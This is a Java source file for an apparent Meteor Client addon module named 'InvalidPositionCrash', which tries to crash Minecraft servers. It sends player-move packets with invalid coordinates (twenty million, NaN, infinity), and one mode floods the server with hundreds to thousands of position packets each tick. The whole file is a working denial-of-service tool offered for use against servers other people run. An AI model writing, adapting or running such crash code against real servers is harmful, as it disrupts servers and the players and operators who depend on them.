package widecat.meteorcrashaddon.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.ClickType;
import widecat.meteorcrashaddon.CrashAddon;


public class InvalidPositionCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> packetMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which position crash to use.")
        .defaultValue(Modes.TWENTY_MILLION)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(500)
        .min(1)
        .sliderMax(10000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public InvalidPositionCrash() {
        super(CrashAddon.CATEGORY, "invalid-position-crash", "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
    }

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            switch (packetMode.get()) {
                case TWENTY_MILLION -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, true));
                    toggle();
                }
                case Y_NAN -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), Double.NaN, mc.player.getZ(), true));
                    toggle();
                }
                case FULL_NAN -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, true));
                    toggle();
                }
                case INFINITY -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                    toggle();
                }
                case TP -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                }
            }
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        switch (packetMode.get()) {
            case TP -> {
                for (double i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * 9), mc.player.getZ(), true));
                }
                for (double i = 0; i < amount.get() * 10; i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9), true));
                }
            }
        }
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        TWENTY_MILLION,
        Y_NAN,              //patched in vanilla
        FULL_NAN,           //patched in vanilla
        INFINITY,
        TP
    }
}
